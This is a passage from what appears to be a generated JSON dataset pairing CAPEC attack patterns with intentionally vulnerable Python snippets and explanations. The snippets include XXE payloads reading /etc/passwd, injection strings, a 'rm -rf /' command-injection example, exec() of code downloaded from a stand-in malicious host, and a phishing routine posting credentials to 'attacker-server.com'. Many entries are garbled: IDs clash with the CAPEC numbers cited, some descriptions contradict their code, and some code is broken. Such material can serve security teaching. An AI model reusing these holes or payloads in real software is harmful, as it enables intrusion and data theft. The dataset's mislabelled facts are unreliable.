        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Validate the file path\n    if not file_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path')\n    \n    # Canonicalize the file path\n    canonical_path = os.path.realpath(file_path)\n    \n    # Validate again after canonicalization\n    if not canonical_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path after canonicalization')\n    \n    # Read the file\n    with open(canonical_path, 'r') as file:\n        return file.read()\n\n# Example usage\ntry:\n    content = read_file('/safe/directory/../etc/passwd')\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding' and associated CWEs. The function `read_file` is intended to read a file from a safe directory. It first validates the file path to ensure it starts with '/safe/directory/'. However, if the file path contains alternate encodings or special characters (like '../'), it can bypass this validation. The code then canonicalizes the file path using `os.path.realpath` to resolve any symbolic links or relative paths. After canonicalization, it validates the path again to ensure it still resides within the safe directory. This double validation helps prevent path traversal attacks (CWE-22) and improper handling of alternate encodings (CWE-173). The example usage demonstrates how an attempt to read '/safe/directory/../etc/passwd' is correctly identified as invalid after canonicalization, preventing unauthorized access to sensitive files."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Improper input validation (CWE-20)\n    if not file_path:\n        raise ValueError('File path cannot be empty')\n\n    # Incorrect behavior order: Validate before canonicalize (CWE-180)\n    if '..' in file_path or '\\' in file_path or '/' in file_path:\n        raise ValueError('Invalid file path')\n\n    # Canonicalize the path\n    canonical_path = os.path.realpath(file_path)\n\n    # External control of file name or path (CWE-73)\n    with open(canonical_path, 'r') as file:\n        return file.read()\n\n# Example usage\ntry:\n    content = read_file('../etc/passwd')\n    print(content)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Slashes in Alternate Encoding'. The function `read_file` takes a file path as input and attempts to read the file's content. The code improperly validates the input before canonicalizing it (CWE-180), which can lead to path traversal attacks (CWE-22). Additionally, it does not properly handle alternate encodings of slashes (CWE-173), allowing an attacker to potentially bypass the validation checks. The code also exemplifies improper input validation (CWE-20) and external control of file name or path (CWE-73). The example usage shows how an attacker might exploit this vulnerability to access sensitive files."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import os\n\n# Function to validate and sanitize file path\ndef validate_and_sanitize_path(user_input):\n    # Validate input (Improper Input Validation - CWE-20)\n    if not user_input.isascii():\n        raise ValueError(\"Invalid input: Non-ASCII characters detected\")\n\n    # Canonicalize the path (Incorrect Behavior Order: Validate Before Canonicalize - CWE-180)\n    canonical_path = os.path.normpath(user_input)\n\n    # Check for directory traversal (External Control of File Name or Path - CWE-73)\n    if '..' in canonical_path:\n        raise ValueError(\"Invalid input: Directory traversal detected\")\n\n    return canonical_path\n\n# Example usage\nuser_input = \"..%2f..%2fetc%2fpasswd\"  # UTF-8 encoded directory traversal attempt\ntry:\n    safe_path = validate_and_sanitize_path(user_input)\n    print(f\"Sanitized Path: {safe_path}\")\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to using UTF-8 encoding to bypass validation logic. The function `validate_and_sanitize_path` is intended to validate and sanitize a file path provided by the user. However, it first validates the input for non-ASCII characters (CWE-20) before canonicalizing the path (CWE-180), which is an incorrect behavior order. This allows an attacker to use UTF-8 encoded sequences to bypass the validation logic. Additionally, the code checks for directory traversal patterns (CWE-73) after canonicalization. The example usage shows how a UTF-8 encoded directory traversal attempt can bypass the initial validation, highlighting the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import logging\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n# Configure logging\nlogging.basicConfig(filename='webserver.log', level=logging.INFO)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Vulnerable logging: does not neutralize special characters\n    logging.info(f'User input: {user_input}')\n    return 'Input received'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that logs user input to a file. The logging mechanism is vulnerable to Web Server Logs Tampering (CAPEC-117) because it does not neutralize special characters or control sequences in the user input. This can lead to log injection attacks where an attacker can manipulate the log file by injecting malicious data. The code also highlights related CWEs such as Improper Output Neutralization for Logs (CWE-117), Improper Neutralization of CRLF Sequences (CWE-93), and Improper Input Validation (CWE-20)."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (untrusted source)\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n  <data>&xxe;</data>\n</root>\n'''\n\ntry:\n    # Parse the XML data without validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(root.find('data').text)\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to improper restriction of XML External Entity (XXE) references (CWE-611). The code parses XML data from an untrusted source without validating it against a schema. The XML data includes an external entity that attempts to access the '/etc/passwd' file on the system. This represents a security risk as it allows attackers to read sensitive files or perform other malicious actions. The code highlights the importance of validating and properly handling XML content to prevent such vulnerabilities."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef authenticate_user(username, password):\n    # Simulated XML database\n    xml_data = '''\n    <users>\n        <user>\n            <username>admin</username>\n            <password>admin123</password>\n        </user>\n        <user>\n            <username>user</username>\n            <password>user123</password>\n        </user>\n    </users>\n    '''\n    \n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    \n    # Construct XPath query using user input (vulnerable to XPath Injection)\n    xpath_query = f\".//user[username='{username}' and password='{password}']\"\n    \n    # Execute the XPath query\n    user = root.find(xpath_query)\n    \n    if user is not None:\n        return \"Authentication successful\"\n    else:\n        return \"Authentication failed\"\n\n# Example usage\nprint(authenticate_user(\"admin' or '1'='1\", \"password\"))",
        "description": "This Python code snippet demonstrates a vulnerable authentication function that uses XPath to query an XML database. The function `authenticate_user` takes a username and password as input and constructs an XPath query to find a matching user in the XML data. However, the input is not properly sanitized, making it susceptible to XPath Injection attacks. An attacker can manipulate the input to bypass authentication, as shown in the example usage where the input `\"admin' or '1'='1\"` allows the attacker to bypass the password check. This code embodies the main idea of CAPEC-91 (XPath Injection) and related CWEs, highlighting the importance of proper input validation and neutralization."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import lxml.etree as ET\n\n# User input that is not properly sanitized\nuser_input = \"' or '1'='1\"\n\n# Constructing an XQuery expression using unsanitized user input\nxquery = f\"/users/user[username='{user_input}']/data\"\n\n# Loading an example XML document\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <data>Admin Data</data>\n    </user>\n    <user>\n        <username>guest</username>\n        <data>Guest Data</data>\n    </user>\n</users>\n'''\n\ndoc = ET.fromstring(xml_data)\n\n# Executing the XQuery expression\nresult = doc.xpath(xquery)\n\n# Output the result\nprint(result)\n",
        "description": "This Python code snippet demonstrates an XQuery Injection vulnerability. The code constructs an XQuery expression using unsanitized user input, which can be manipulated by an attacker to alter the query's structure. In this example, the user input is designed to always return true (' or '1'='1'), potentially exposing sensitive data. The code loads an XML document and executes the constructed XQuery expression, illustrating how improper neutralization of input can lead to security vulnerabilities. This example aligns with the CAPEC description and related CWEs, highlighting the risks of injection attacks in XML databases."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "from flask import Flask, request, jsonify\nimport re\n\napp = Flask(__name__)\n\n# Vulnerable endpoint that echoes back user input\n@app.route('/echo', methods=['GET'])\ndef echo():\n    user_input = request.args.get('input')\n    # Improper input validation (CWE-20)\n    if not user_input:\n        return 'No input provided', 400\n    # Improper neutralization of input (CWE-79)\n    response = f'<p>{user_input}</p>'\n    return response\n\n# Vulnerable endpoint that uses user input in HTTP headers\n@app.route('/header', methods=['GET'])\ndef header():\n    user_input = request.args.get('input')\n    # Improper neutralization of CRLF sequences (CWE-113)\n    response = jsonify(message='Header set')\n    response.headers['X-User-Input'] = user_input\n    return response\n\n# Vulnerable endpoint that uses less trusted source (CWE-348)\n@app.route('/trusted', methods=['GET'])\ndef trusted():\n    user_input = request.args.get('input')\n    # Use of less trusted source\n    trusted_source = 'trusted_value'\n    if user_input:\n        trusted_source = user_input\n    return jsonify(trusted_source=trusted_source)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with three endpoints that embody the main idea of AJAX Footprinting and related CWEs. The '/echo' endpoint improperly neutralizes user input, making it vulnerable to Cross-Site Scripting (CWE-79). The '/header' endpoint improperly neutralizes CRLF sequences in HTTP headers, making it vulnerable to HTTP Request/Response Splitting (CWE-113). The '/trusted' endpoint uses a less trusted source for user input, making it vulnerable to attacks due to the use of less trusted data (CWE-348). These vulnerabilities can be exploited by an attacker to gather information about the target environment, which can be used to support further attacks."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    response = make_response(f'<html><body><h1>Welcome!</h1><p>Your user agent is: {user_agent}</p></body></html>')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates a vulnerability to XSS through HTTP headers. The application retrieves the 'User-Agent' header from the incoming HTTP request and directly includes it in the HTML response without any validation or sanitization. This can be exploited by an attacker to inject malicious scripts via the 'User-Agent' header, leading to Cross-Site Scripting (XSS) attacks. The code embodies the main idea of the CAPEC by showing how unvalidated HTTP headers can be used to generate web content, making the application vulnerable to XSS attacks. The related CWEs provide additional context on the types of improper neutralization that can lead to such vulnerabilities."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# Simulated user roles\nuser_roles = {\n    'user1': 'admin',\n    'user2': 'user'\n}\n\n# Simulated session\nsession = {'username': 'user2'}\n\n@app.route('/admin')\ndef admin_panel():\n    if session['username'] not in user_roles or user_roles[session['username']] != 'admin':\n        return 'Access Denied', 403\n    return 'Welcome to the admin panel'\n\n@app.route('/user')\ndef user_panel():\n    return 'Welcome to the user panel'\n\n@app.route('/forceful_browsing')\ndef forceful_browsing():\n    # Direct URL access without proper authorization check\n    if 'page' in request.args:\n        page = request.args.get('page')\n        if page == 'admin':\n            return redirect(url_for('admin_panel'))\n        elif page == 'user':\n            return redirect(url_for('user_panel'))\n    return 'Invalid page', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate a vulnerability related to forceful browsing. The application has two main routes: '/admin' and '/user', which are intended for admin and regular users, respectively. The '/forceful_browsing' route allows direct URL access to these pages based on a query parameter without proper authorization checks. This can lead to unauthorized access to the admin panel if an attacker manipulates the 'page' parameter. The code highlights the CWE-425 (Direct Request), CWE-285 (Improper Authorization), and CWE-598 (Use of GET Request Method With Sensitive Query Strings) vulnerabilities by showing how an attacker can bypass access controls and gain unauthorized access to restricted areas of the application."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a basic example of OS Command Injection vulnerability. The function `execute_command` takes user input and constructs an OS command string without proper validation or neutralization of special elements. The `os.system` function then executes this command. An attacker can exploit this by providing malicious input, such as `; rm -rf /`, to execute arbitrary commands on the underlying operating system. This code embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef get_hostname(ip_address):\n    try:\n        return socket.gethostbyaddr(ip_address)[0]\n    except socket.herror:\n        return None\n\n# CWE-346: Origin Validation Error\ndef validate_origin(ip_address, expected_hostname):\n    hostname = get_hostname(ip_address)\n    if hostname != expected_hostname:\n        raise ValueError('Origin validation failed')\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        raise ValueError('Failed to download code')\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\ndef client_side_enforcement(user_input):\n    if '<script>' in user_input:\n        raise ValueError('Client-side validation failed')\n    return user_input\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return f'<html><body>{user_input}</body></html>'\n\n# Simulate a pharming attack scenario\nip_address = '192.168.1.1'\nexpected_hostname = 'trustedbank.com'\n\ntry:\n    validate_origin(ip_address, expected_hostname)\n    user_input = client_side_enforcement('<script>alert(\"XSS\")</script>')\n    web_page = generate_web_page(user_input)\n    print(web_page)\nexcept ValueError as e:\n    print(e)\n\n# Simulate downloading code without integrity check\ndownload_code('http://malicious.com/malware.py')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to a pharming attack. The `get_hostname` function (CWE-350) performs reverse DNS resolution, which is used in `validate_origin` (CWE-346) to check if the IP address matches the expected hostname. The `download_code` function (CWE-494) downloads and executes code from a URL without verifying its integrity. The `client_side_enforcement` function (CWE-602) attempts to validate user input on the client side, which is insecure. The `generate_web_page` function (CWE-79) improperly neutralizes user input, leading to potential XSS attacks. The code simulates a pharming attack by validating an IP address against a hostname, processing user input, and downloading code from an untrusted source."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import socket\n\n# Simple challenge-response authentication protocol\nclass AuthServer:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.secret_key = \"secret\"\n\n    def start_server(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.bind((self.host, self.port))\n            s.listen()\n            conn, addr = s.accept()\n            with conn:\n                print('Connected by', addr)\n                challenge = \"12345\"\n                conn.sendall(challenge.encode())\n                response = conn.recv(1024).decode()\n                if response == self.secret_key + challenge:\n                    conn.sendall(b\"Authenticated\")\n                else:\n                    conn.sendall(b\"Authentication Failed\")\n\nclass AuthClient:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.secret_key = \"secret\"\n\n    def authenticate(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.host, self.port))\n            challenge = s.recv(1024).decode()\n            response = self.secret_key + challenge\n            s.sendall(response.encode())\n            result = s.recv(1024).decode()\n            print(result)\n\n# Vulnerable to reflection attack\nserver = AuthServer('localhost', 65432)\nclient = AuthClient('localhost', 65432)\n\n# Start the server in a separate thread or process in a real scenario\nimport threading\nserver_thread = threading.Thread(target=server.start_server)\nserver_thread.start()\n\n# Client attempts to authenticate\nclient.authenticate()",
        "description": "This Python code snippet demonstrates a simple challenge-response authentication protocol that is vulnerable to a reflection attack. The `AuthServer` class sends a challenge to the client, and the client responds with a combination of a secret key and the challenge. If the response matches the expected value, the client is authenticated. However, this implementation is vulnerable to reflection attacks because an attacker can intercept the challenge and response, and then use the same challenge to authenticate themselves without knowing the secret key. This code embodies the main idea of CAPEC-301 (Reflection Attack in an Authentication Protocol) and is also related to other CWEs such as CWE-303 (Incorrect Implementation of Authentication Algorithm) and CWE-294 (Authentication Bypass by Capture-replay)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable to XSS in IMG tags\n    html_content = f'<img src=\"{user_input}\" />'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks, specifically within the context of IMG tags. The application takes user input from a query parameter 'input' and directly inserts it into the 'src' attribute of an IMG tag without proper sanitization or neutralization. This can lead to XSS attacks if an attacker provides a malicious script as input. The code embodies the main idea of the deprecated CAPEC-18 and related CWEs, such as CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags), CWE-87 (Improper Neutralization of Alternate XSS Syntax), and CWE-80 (Improper Neutralization of Script-Related HTML Tags)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "import sys\n\n# Function to simulate forced integer overflow\n# CWE-190: Integer Overflow or Wraparound\n# CWE-680: Integer Overflow to Buffer Overflow\ndef allocate_memory(size):\n    # Simulate an integer overflow by using a large value\n    max_int = sys.maxsize\n    if size > max_int:\n        size = size - (max_int + 1)  # This causes wraparound\n    \n    # CWE-122: Heap-based Buffer Overflow\n    buffer = [0] * size  # Allocate memory based on the size\n    return buffer\n\n# User-controlled input\nuser_input = int(input(\"Enter the size of memory to allocate: \"))\n\n# CWE-697: Incorrect Comparison\nif user_input < 0:\n    print(\"Invalid size\")\nelse:\n    try:\n        buffer = allocate_memory(user_input)\n        print(f\"Allocated buffer of size: {len(buffer)}\")\n    except MemoryError:\n        print(\"Memory allocation failed\")",
        "description": "This Python code snippet demonstrates a forced integer overflow vulnerability. The `allocate_memory` function takes a user-controlled input `size` and simulates an integer overflow by wrapping around when the size exceeds the maximum integer value (`sys.maxsize`). This can lead to incorrect memory allocation, potentially causing a heap-based buffer overflow (CWE-122). The code also includes an incorrect comparison (CWE-697) by only checking if the user input is negative, which is insufficient to prevent the overflow. This example embodies the main idea of the CAPEC by showing how an attacker can manipulate an integer variable to cause unexpected behavior and potentially exploit the system."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\n# Configure logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to log user input\ndef log_user_action(user_input):\n    # CWE-117: Improper Output Neutralization for Logs\n    # CWE-75: Failure to Sanitize Special Elements into a Different Plane\n    # CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n    logging.info(f'User action: {user_input}')\n\n# Example of user input that could be malicious\nuser_input = \"User logged in; DROP TABLE users; --\"\nlog_user_action(user_input)\n\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-779: Logging of Excessive Data\nsensitive_info = \"User password: secret_password\"\nlogging.info(f'Sensitive info: {sensitive_info}')",
        "description": "This Python code snippet demonstrates a logging mechanism that is vulnerable to log injection, tampering, and forging attacks. The `log_user_action` function logs user input directly without proper sanitization or neutralization, making it susceptible to CWE-117, CWE-75, and CWE-150. Additionally, sensitive information is logged directly (CWE-532), and excessive data logging is shown (CWE-779). This code highlights the risks of improper log handling and the potential for malicious manipulation of log files."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\n# Create a context that does not verify the server's certificate\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Connect to the server\nhostname = 'example.com'\nport = 443\nsock = socket.create_connection((hostname, port))\nssl_sock = context.wrap_socket(sock, server_hostname=hostname)\n\n# Intercept and modify data\nrequest = b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\nssl_sock.sendall(request)\nresponse = ssl_sock.recv(4096)\n\n# Print the intercepted response\nprint(response.decode('utf-8'))\n\nssl_sock.close()",
        "description": "This Python code snippet demonstrates an Adversary in the Middle (AiTM) attack by creating an SSL context that does not verify the server's certificate, allowing an attacker to intercept and modify data between a client and server. The code connects to a server using SSL, sends a request, and prints the intercepted response. This embodies CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the server's identity, CWE-287 (Improper Authentication) by not proving the server's identity, and CWE-290 (Authentication Bypass by Spoofing) by allowing potential spoofing attacks."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import requests\n\n# URL of the WSDL file\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Function to scan WSDL file\ndef scan_wsdl(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            wsdl_content = response.text\n            print('WSDL Content Retrieved:')\n            print(wsdl_content)\n            # Example of extracting sensitive information\n            if 'password' in wsdl_content or 'secret' in wsdl_content:\n                print('Sensitive information found in WSDL file!')\n        else:\n            print('Failed to retrieve WSDL file')\n    except Exception as e:\n        print(f'Error occurred: {e}')\n\n# Scan the WSDL file\nscan_wsdl(wsdl_url)",
        "description": "This Python code snippet demonstrates a basic WSDL scanning attack. The script sends an HTTP GET request to retrieve the WSDL file from a specified URL. If the WSDL file is successfully retrieved, the content is printed, and a simple check is performed to identify the presence of sensitive information such as 'password' or 'secret'. This embodies the main idea of CAPEC-220 (WSDL Scanning) by showing how an attacker might probe a WSDL interface to reveal sensitive information. The related CWEs are represented by the potential exposure of sensitive information within the WSDL file (CWE-651) and the use of GET requests to access this information (CWE-598)."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import os\n\n# Function to read a file using a third-party library\ntry:\n    import third_party_lib\nexcept ImportError:\n    print(\"Error: Required third-party library is not available.\")\n    exit(1)\n\n# Function that uses a non-ubiquitous API\ntry:\n    result = os.non_ubiquitous_function()\nexcept AttributeError:\n    print(\"Error: The API function does not exist on this platform.\")\n    exit(1)\n\n# Function that improperly handles memory buffer\ndef read_buffer(buffer, index):\n    try:\n        return buffer[index]\n    except IndexError:\n        print(\"Error: Buffer index out of bounds.\")\n        exit(1)\n\n# Main function\nif __name__ == \"__main__\":\n    buffer = [1, 2, 3]\n    print(read_buffer(buffer, 5))",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Block Access to Libraries' and the associated CWEs. The code attempts to import a third-party library and handle the case where the library is not available, which could leave the system in an insecure state (CWE-829). It also uses a non-ubiquitous API function from the 'os' module, which may not exist on all platforms, leading to potential denial of service (CWE-589). Additionally, the code includes a function that improperly handles memory buffer access, potentially reading out of bounds (CWE-119). The main function attempts to read from a buffer using an out-of-bounds index, demonstrating improper error handling and potential security risks."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\n# Use of a weak cryptographic algorithm (CWE-327)\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_CBC, iv=b'0000000000000000')  # Weak IV (CWE-1204)\n    return cipher.encrypt(pad(data, AES.block_size))\n\n# Use of a predictable random number generator (CWE-1241)\ndef generate_key():\n    return b'1234567890123456'  # Predictable key\n\n# Main function demonstrating cryptographic operations\nif __name__ == '__main__':\n    key = generate_key()\n    data = b'Secret Data'\n    encrypted_data = encrypt(data, key)\n    print(f'Encrypted Data: {encrypted_data}')",
        "description": "This Python code snippet demonstrates several cryptographic weaknesses as described in the CAPEC and related CWEs. The `encrypt` function uses AES in CBC mode with a weak, predictable initialization vector (IV) of all zeros (CWE-1204). The `generate_key` function returns a predictable key (CWE-1241). The use of AES in this manner represents the use of a broken or risky cryptographic algorithm (CWE-327). The main function encrypts a piece of data using these weak cryptographic practices, illustrating how improper implementation can lead to vulnerabilities exploitable through cryptanalysis."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import requests\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n\ndef phishing_attack(user_input_url):\n    # Simulate a phishing email with a malicious link\n    malicious_url = 'http://malicious-site.com/login'\n    if 'trusted-site.com' in user_input_url:\n        # CWE-601: Redirect to malicious site\n        redirect_url = malicious_url\n    else:\n        redirect_url = user_input_url\n\n    # CWE-451: Misrepresent the URL in the UI\n    print(f'Click here to login: {redirect_url}')\n\n    # CWE-506: Embedded Malicious Code\n    # CWE-507: Trojan Horse\n    # CWE-512: Spyware\n    def malicious_code():\n        # Simulate data collection\n        user_data = {'username': 'user', 'password': 'pass'}\n        # Send collected data to attacker's server\n        requests.post('http://attacker-server.com/collect', data=user_data)\n\n    # Execute the malicious code\n    malicious_code()\n\n# Example usage\nphishing_attack('http://trusted-site.com')",
        "description": "This Python code snippet simulates a phishing attack by redirecting a user to a malicious URL and collecting their credentials. The function `phishing_attack` takes a user-provided URL and checks if it contains 'trusted-site.com'. If it does, it redirects the user to a malicious site (CWE-601). The URL is misrepresented in the UI to trick the user (CWE-451). The `malicious_code` function simulates the collection of user credentials and sends them to an attacker's server (CWE-506, CWE-507, CWE-512). This code embodies the main idea of phishing by masquerading as a legitimate entity to gather confidential information."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(ET.tostring(root, encoding='unicode'))\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Parse the XML data\nparse_xml(xml_data)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611: Improper Restriction of XML External Entity Reference. The code uses the xml.etree.ElementTree module to parse an XML string that includes an external entity reference. The XML data contains a DOCTYPE declaration with an ENTITY that attempts to read the contents of the /etc/passwd file. When the parse_xml function processes this XML, it will try to resolve the external entity, potentially exposing sensitive information. This example highlights the risks of processing untrusted XML data without proper validation and entity restriction."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "def vulnerable_function(input_data):\n    buffer = [0] * 10  # Fixed-size buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No bounds checking\n    return buffer\n\n# Example usage\ninput_data = [1] * 15  # Input larger than buffer size\nvulnerable_function(input_data)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function 'vulnerable_function' takes 'input_data' as an argument and attempts to copy its contents into a fixed-size buffer of 10 elements. However, there is no bounds checking to ensure that 'input_data' fits within the buffer. If 'input_data' is larger than the buffer, this will result in a buffer overflow, potentially causing a program crash or allowing an adversary to manipulate the program's execution. This example embodies the main idea of the CAPEC 'Overflow Buffers' and is related to CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET', 'POST'])\ndef vulnerable():\n    if request.method == 'POST':\n        user_input = request.form['user_input']\n        # Vulnerable to SSI Injection\n        response = render_template_string(\"\"\"\n        <!--#echo var='user_input' -->\n        \"\"\".replace('user_input', user_input))\n        return response\n    return '''\n        <form method=\"post\">\n            <input type=\"text\" name=\"user_input\">\n            <input type=\"submit\">\n        </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Server Side Include (SSI) Injection. The application has a route '/vulnerable' that accepts both GET and POST requests. When a POST request is made, it takes user input from a form and directly includes it in a server-side include directive without proper sanitization. This allows an attacker to inject SSI directives, potentially leading to arbitrary code execution or information disclosure. The code highlights CWE-97 (Improper Neutralization of Server-Side Includes), CWE-74 (Improper Neutralization of Special Elements), and CWE-20 (Improper Input Validation) by showing how user input is improperly handled and included in the server-side code."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import http.client\n\n# Establish an unencrypted HTTP connection\nconn = http.client.HTTPConnection('example.com')\n\n# Send a login request with credentials in cleartext\nconn.request('POST', '/login', 'username=admin&password=admin123')\n\n# Get the response which includes a session token in cleartext\nresponse = conn.getresponse()\nset_cookie_header = response.getheader('Set-Cookie')\nsession_token = set_cookie_header.split(';')[0]\n\nprint(f'Session token: {session_token}')\n\n# Use the session token to perform an action as the authenticated user\nheaders = {'Cookie': session_token}\nconn.request('GET', '/sensitive_action', headers=headers)\nresponse = conn.getresponse()\nprint(response.read().decode())",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a login mechanism that transmits credentials and session tokens in cleartext over an unencrypted HTTP connection. The code first establishes an HTTP connection to 'example.com' and sends a POST request with the username and password in the request body. The server responds with a session token in the 'Set-Cookie' header, which is then extracted and used to perform an authenticated action. This code embodies the main idea of CAPEC-Session Sidejacking by showing how an attacker could sniff the network traffic to capture the session token and impersonate the user. The related CWEs are represented by the cleartext transmission of sensitive information (CWE-319), insufficiently protected credentials (CWE-522), and unprotected transport of credentials (CWE-523)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
